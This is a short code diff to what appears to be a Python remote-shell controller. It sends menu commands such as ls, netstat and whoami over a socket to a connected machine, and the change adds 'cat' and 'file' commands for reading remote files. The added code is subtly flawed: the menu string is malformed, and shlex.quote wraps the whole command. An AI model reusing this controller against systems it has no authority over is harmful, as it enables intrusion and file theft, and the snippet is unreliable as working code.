@@ -31,7 +31,7 @@ def start():
             continue
 
         print(f'{GREEN}     Options    {RESET}\n ')
-        print(f'{GREEN}[*] ls\n[*] netstat\n[*] ifconfig\n[*] ps\n[*] df\n[*] whoami\n[*] exit{RESET}')
+        print(f'{GREEN}[*] ls\n[*] netstat\n[*] ifconfig\n[*] ps\n[*] df\n[*] whoami\n[*]cat\n[*]file[*]exit\n{RESET}')
         while True:
             cmd = input(f'{GREEN}>>> {RESET}')
 
@@ -39,6 +39,16 @@ def start():
                 conn.close()
                 break
             elif cmd in ['ls', 'netstat', 'ifconfig', 'ps', 'df', 'whoami']:
+                cmd = shlex.quote(cmd)
+                conn.sendall(cmd.encode())
+                response = conn.recv(1024).decode()
+                print(response)
+            elif cmd.startswith('cat '):
+                cmd = shlex.quote(cmd)
+                conn.sendall(cmd.encode())
+                response = conn.recv(1024).decode()
+                print(response)
+            elif cmd.startswith('file '):
                 cmd = shlex.quote(cmd)
                 conn.sendall(cmd.encode())
                 response = conn.recv(1024).decode()
